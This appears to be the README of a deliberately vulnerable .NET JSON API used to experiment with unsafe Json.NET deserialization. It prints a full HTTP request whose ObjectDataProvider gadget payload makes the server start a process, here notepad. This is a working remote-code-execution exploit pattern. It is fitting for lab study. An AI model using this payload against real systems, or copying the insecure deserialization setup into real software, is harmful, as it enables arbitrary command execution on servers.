# CerealKiller
Simple Vulnerable JSON API

Built out of a desire to experiment with unsafe .NET deserialization, CerealKiller basically ripped off [How to configure Json.NET to create a vulnerable web API](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html).

The insecure endpoint is at /api/Insecure which deserializes an object (called 'Obj') passed via a POST request:

    POST /api/Insecure HTTP/1.1
    Host: localhost:50244
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    Content-Length: 527

    {
      "Obj": {
        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName": "Start",
        "MethodParameters": {
          "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
          "$values": [
            "notepad"
          ]
        },
        "ObjectInstance": {
          "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        }
      }
  }
